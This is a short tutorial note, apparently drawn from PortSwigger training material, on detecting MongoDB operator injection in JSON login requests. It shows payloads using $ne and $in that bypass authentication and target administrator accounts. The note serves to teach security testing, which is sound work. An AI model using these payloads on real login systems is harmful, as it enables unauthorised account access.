# Detecting NoSQL Operator Injection

## Overview

After identifying possible NoSQL injection points, the next step is determining whether the application processes MongoDB query operators.

The PortSwigger methodology recommends testing each user-controlled parameter with different operators.

---

# Example Login Request

Original request:

```json
{
  "username":"wiener",
  "password":"peter"
}
```

---

# Testing the Username

Replace the username value with:

```json
{
  "username":{"$ne":"invalid"},
  "password":"peter"
}
```

If the application processes the `$ne` operator, the query matches all usernames that are not equal to `"invalid"`.

---

# Testing Both Parameters

If both parameters process operators:

```json
{
  "username":{"$ne":"invalid"},
  "password":{"$ne":"invalid"}
}
```

the query returns records where neither field equals `"invalid"`.

This may allow authentication bypass.

---

# Targeting Specific Accounts

Instead of matching every user, the PortSwigger material demonstrates targeting administrator accounts.

Example:

```json
{
  "username":{"$in":["admin","administrator","superadmin"]},
  "password":{"$ne":""}
}
```

---

# Why It Works

The injected operators become part of the MongoDB query.

Instead of comparing literal values, the database evaluates operator expressions.

---

# Key Takeaways

- Test each parameter individually.
- Observe differences in application responses.
- Successful processing of operators indicates a potential operator injection vulnerability.